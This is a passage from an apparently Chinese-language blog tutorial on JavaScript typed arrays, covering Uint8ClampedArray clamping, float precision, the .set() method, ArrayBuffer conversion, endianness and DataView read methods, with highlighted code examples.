punctuation">;</span> <span class="token comment">// 6</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i32<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外 <code>byteLength</code> 这个属性其实指的是类型数组总的字节大小，其值等于单个元素字节值乘以元素个数（<code>byteLength = BYTES_PER_ELEMENT x length</code>）;</p><h3 id="Clamped"><a href="#Clamped" class="headerlink" title="Clamped"></a>Clamped</h3><p>鹤难隐于鸡群；从前面的清单中可以找到 <code>Uint8ClampedArray</code> 这个独特的类型数组，区别就是中间多了 <code>clamped</code> 这个单词，词典解释的意思是“夹紧，箝位”，具体功能是什么，下面通过代码来解释：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _i8_ <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">257</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> uic8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8ClampedArray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">var</span> _uic8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8ClampedArray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">var</span> _uic8_ <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8ClampedArray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">257</span><span class="token punctuation">]</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Int8Array(3) [1, 2, 3]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_i8<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Int8Array(3) [255, 254, 253]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_i8_<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Uint8Array(3) [255, 0, 1]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>uic8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Uint8ClampedArray(3) [1, 2, 3]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_uic8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Uint8ClampedArray(3) [0, 0, 0]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_uic8_<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Uint8Array(3) [255, 255, 255]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不知诸位可否查探出端倪，这里也能解释之前说的无符号类型数组实例化时转换负值的问题；通过分析不难发现，转换方式类似于素组循环取值，就是如果传入的值超过了元素的取值范围的上限或下限之一时，那么超过的部分就会，从范围的另一个界限开始依次向后计数；所以上例中 <strong>-1</strong> 会被转换为 <strong>255</strong>，<strong>257</strong> 会被转换成 <strong>1</strong>；</p><p>而对于 <code>Uint8ClampedArray</code> 这个类型数组，其实差不多也是字面的意思，类似于一个 “夹住” 的操作：超出范围不会发生循环转换，无论超出多少都只会被置为对应的边界值，所以上例中 <code>-1, -2, -3</code> 都被转换为 <code>0</code>，<code>256, 257</code> 则都被转换成了 <code>255</code>；</p><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p>论世间谁主浮沉；仅有的两个浮点类型的类型数组，<code>Float32Array</code> 和 <code>Float64Array</code>，浮点的意思就是元素值可以是小数，因为之前介绍过的都是 <code>int</code>(整数) 类型的；依然来举例说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> f32 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float32Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.11</span><span class="token punctuation">,</span> <span class="token number">2.12345678911</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3.33333333333333333333333333</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">var</span> f64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.11</span><span class="token punctuation">,</span> <span class="token number">2.12345678911</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3.33333333333333333333333333</span><span class="token punctuation">]</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>f32<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Float32Array(3) [1.1100000143051147, 2.1234567165374756, -3.3333332538604736]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>f64<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Float64Array(3) [1.11, 2.12345678911, -3.3333333333333335]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从结果来看 32 位浮点类型数组每个元素都保留到小数点后 16 位，而 64 位是最多保留到 16 位，具体的细节就不深究了；</p><h2 id="操作元素"><a href="#操作元素" class="headerlink" title="操作元素"></a>操作元素</h2><p>欲与二进制数据一决高低，首先肯定是选几样趁手兵器；虽然类型化数组拥有普通数组的大部分方法，比如 <code>every</code>, <code>forEach</code>, <code>slice</code> 等等，但也有自己特有的方法值得说一下，比如 <strong>.set()</strong> 这个方法；</p><p><code>.set()</code> 方法用于把指定数组的（所有）元素添加到当前数组的指定位置，接受的参数为 <code>.set(array[, ofset])</code>，这里的 array 可以是普通数组或类型化数组，offset 指的是偏移值，即从哪个位置开始写入指定数组元素；举例说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i81 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i82 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>i8<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Int8Array(6) [0, 0, 1, 2, 3, 0]</span>i81<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i81<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Uncaught RangeError: offset is out of bounds</span>i82<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i82<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Uncaught RangeError: offset is out of bounds</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>证明无论是拷贝的数组大小超过原数组，还是偏移值过大使得拷贝结果超过原数组，都会报错提示偏移超过边界，因此使用时需计算准确；</p><h2 id="操作缓冲区"><a href="#操作缓冲区" class="headerlink" title="操作缓冲区"></a>操作缓冲区</h2><p>箭在弦上，东风将至；前面将 TypedArray 描述为操作 ArrayBuffer 中数据的视图，下面就来看一下具体的操作方法；</p><h3 id="数据读取"><a href="#数据读取" class="headerlink" title="数据读取"></a>数据读取</h3><h4 id="数据转换"><a href="#数据转换" class="headerlink" title="数据转换"></a>数据转换</h4><p>敌不动我不动；使用类型化数组操作 ArrayBuffer 的数据前，需要先获取其中的数据，也就是把 ArrayBuffer 转换为 TypedArray 类型；先来看一下这两种类型互相转换的方法：</p><p><strong>ArrayBuffer</strong> 转换为 <strong>TypedArray</strong>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 先初始化 5 字节长的区域</span><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 再把数据传递进 TypedArray</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(5) [0, 0, 0, 0, 0]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里也可以验证，ArrayBuffer 新创建的区域数据都被置 0 了；</p><p><strong>TypedArray</strong> 转化为 <strong>ArrayBuffer</strong>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> buffer <span class="token operator">=</span> i8<span class="token punctuation">.</span>buffer<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ArrayBuffer(5) &#123;&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="读取方式"><a href="#读取方式" class="headerlink" title="读取方式"></a>读取方式</h4><p>前面讲道，类型化数组有多种不同的实现，比如 1 字节有符号元素的 <code>Int8Array</code>，2 字节的 <code>Int16Array</code> 等；根据 <code>ArrayBuffer</code> 的定义，缓冲区是以 <strong>1 字节</strong> 为单位进行创建的，所以我们通常读取文本类数据使用 <code>Uint8Array</code>，因为它也正好每个元素的大小为 1 字节，当然，也可以选择用 <code>Uint16Array</code> 来 2 字节地挨个读，其他类型类推；</p><p>通过代码来观察一下具体的读取方式：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">var</span> buffer <span class="token operator">=</span> data<span class="token punctuation">.</span>buffer<span class="token punctuation">;</span><span class="token keyword">var</span> ui8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> ui16 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint16Array</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ui8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Uint8Array(4) [1, 2, 3, 4]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ui16<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Uint16Array(2) [513, 1027]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原始数据 <code>data</code> 是 4 字节大小，通过 <code>Uint8Array</code> 就是以 1 字节为单位，所以得到的也是原始的数据 <code>[1, 2, 3, 4]</code>，这里由于数据小所以有无符号无影响；而通过 <code>Uint16Array</code> 则是以 2 字节为单位进行读取，所以总的元素长度为 2（2 = 4 / 2），但是其中的单个元素 <code>513</code>, <code>1027</code> 又分别是如何得到的呢？我们可以通过计算来探究一下:</p><p>首先看 <code>1, 2</code> 这两个元素，根据结果它们被读取成为了 <code>513</code>，那么就把这几个元素的二进制数表示出来（缓冲区就是存储的二进制数据）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"1"</span><span class="token builtin class-name">:</span>   00000001<span class="token string">"2"</span><span class="token builtin class-name">:</span>   00000010<span class="token string">"12"</span><span class="token builtin class-name">:</span>  00000001 00000010<span class="token string">"513"</span><span class="token builtin class-name">:</span> 00000010 00000001<span class="token string">"21"</span><span class="token builtin class-name">:</span>  00000010 00000001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>规律显而易见了，<code>513</code> 这个 2 字节的数据，其实是把 <code>1</code> 和 <code>2</code> 这两个挨着的 1 字节的数据，以 <strong>倒序</strong> 方式拼接在一起的；</p><p>再来看一下 <code>3</code> 和 <code>4</code> 这两个是否也是以同样的方法得出 <code>1027</code> 这个数据的：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"3"</span><span class="token builtin class-name">:</span>    00000011<span class="token string">"4"</span><span class="token builtin class-name">:</span>    00000100<span class="token string">"34"</span><span class="token builtin class-name">:</span>   00000011 00000100<span class="token string">"1027"</span><span class="token builtin class-name">:</span> 00000100 00000011<span class="token string">"43"</span><span class="token builtin class-name">:</span>   00000100 00000011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果不出所料，所以像 <code>Uint32Array</code> 等以多个字节读取数据的类型数组，方法也可以类推；</p><h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><p>另外值得一提的是，上面所说的 <strong>倒序</strong> 拼接方式，其实有个专业术语，叫做 <strong>字节序（Endian）</strong>，对应这个英文单词应该会感觉似曾相识，例如 Linux 中执行 <code>lscpu</code> 得到的结果中，就会发现它的存在：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Architecture:        x86_64CPU op-mode<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:      <span class="token number">32</span>-bit, <span class="token number">64</span>-bitByte Order:          Little EndianAddress sizes:       <span class="token number">36</span> bits physical, <span class="token number">48</span> bits virtual<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>字节序，或字节顺序（”Endian”、”endianness” 或 “byte-order”），描述了计算机如何组织字节，组成对应的数字。</p></blockquote><p>这个字节序可以分为：</p><p><strong>Little Endia（低字节序）</strong>：低位数据放入存储地址的低位，高位数据放入高位地址；</p><p>这种顺序就显得和内存上的存储地址顺序（阅读模式下低位在右，高位在左）保持一致，并且也是一种常见的方式，比如上面的英特尔处理器；只不过对于这种顺序人类阅读时就要反着读了（从右至左），比如上面例子中的数据 <code>12</code> 就是以 <code>21</code> 的顺序读取的，也可以类比这种日期格式：<code>&quot;Sat 07 Mar 2020&quot;</code>;</p><p><strong>Big Endian（高字节序）</strong>：低位数据存入高位地址，高位数据放入低位；</p><p>这种顺序可能更符合人类的阅读习惯（从左至右），它一般应用在互联网标准的数据结构中，可以类比 <code>&quot;2020-03-07&quot;</code> 这种日期格式；</p><h3 id="数据修改"><a href="#数据修改" class="headerlink" title="数据修改"></a>数据修改</h3><p>下面通过类型化数组视图来尝试修改一下 ArrayBuffer 缓冲区中的内容：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(3) [0, 0, 0]</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> i8<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    i8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> _i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 新建个视图验证是否修改成功</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(3) [1, 1, 1]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据拼接"><a href="#数据拼接" class="headerlink" title="数据拼接"></a>数据拼接</h3><p>用之前讲过的 <code>.set()</code> 方法来尝试将数据拼接进缓冲区：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i80 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i80<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(6) [0, 0, 0, 0, 0, 0]</span><span class="token keyword">var</span> i81 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i82 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i80<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>i81<span class="token punctuation">)</span><span class="token punctuation">;</span>i80<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>i82<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _i80 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 验证是否修改成功</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_i80<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(6) [1, 2, 3, 4, 5, 6]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong>：这里不能使用数组的 <code>.concat()</code> 这个方法来进行元素拼接，因为类型化数组中并没有内置这个方法，不然会报错，如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr2 <span class="token operator">=</span> arr1<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4, 5, 6]</span><span class="token keyword">var</span> i81 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i82 <span class="token operator">=</span> i81<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i82<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Uncaught TypeError: i81.concat is not a function</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样地，<code>.splice()</code> 这个可以替换元素的方法也不存在于类型化数组中；</p><h1 id="数据视图（DataView）"><a href="#数据视图（DataView）" class="headerlink" title="数据视图（DataView）"></a>数据视图（DataView）</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>一个好汉三个帮；<code>DataView</code> 是另外一个用于从 <code>ArrayBuffer</code> 缓冲区中读写数据的视图接口，其特点就是考虑了 <em>字节序</em> 的问题，后面会讲；</p><p>语法为：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer <span class="token punctuation">[</span><span class="token punctuation">,</span> byteOffset <span class="token punctuation">[</span><span class="token punctuation">,</span> byteLength<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中 <code>buffer</code> 指传入的数据缓冲区，如 ArrayBuffer；<code>byteOffset</code> 指偏移的字节量，默认第一个字节，<code>byteLength</code> 指要传入的数据的字节长度，默认整个 buffer 的长度；并且这三个参数都可以在实例化后通过相应属性（只读）访问到；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buffer<span class="token punctuation">;</span><span class="token keyword">var</span> dv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dv<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// DataView(2) &#123;&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dv<span class="token punctuation">.</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ArrayBuffer(4) &#123;&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dv<span class="token punctuation">.</span>byteOffset<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dv<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="操作数据"><a href="#操作数据" class="headerlink" title="操作数据"></a>操作数据</h2><p>DataView 提供了一系列的方法用于操作缓冲区的数据，先简单预览一下：</p><table><thead><tr><th>Read</th><th>Write</th></tr></thead><tbody><tr><td>getInt8()</td><td>setInt8()</td></tr><tr><td>getUint8()</td><td>setUint8()</td></tr><tr><td>getInt16()</td><td>setInt16()</td></tr><tr><td>getUint16()</td><td>setUint16()</td></tr><tr><td>getInt32()</td><td>setInt32()</td></tr><tr><td>getUint32()</td><td>setUint32()</td></tr><tr><td>getFloat32()</td><td>setFloat32()</td></tr><tr><td>getFloat64()</td><td>setFloat64()</td></tr></tbody></table><h3 id="Read"><a href="#Read" class="headerlink" title="Read"></a>Read</h3><p>以 <code>getInt8()</code> 方法为例，可提供一个参数 <code>byteOffset</code>，表示偏移指定字节数，然后读取 1 字节（8 位）数据，默认 为 0（第一字节）；而如果是 <code>getInt16()</code> 等用于获取大于 1 字节值以及浮点值的方法，还接受第二个可选参数 <code>littleEndian</code>，就是是否使用 little endian（低字节序，上文有讲）格式来读取数据，传入 <code>true</code> 就表示使用 little endian 格式，传入 <code>false</code> 或者不填，就使用 big endian（高字节序） 格式；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buffer<span class="token punctuation">;</span><span class="token keyword">var</span> dv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token 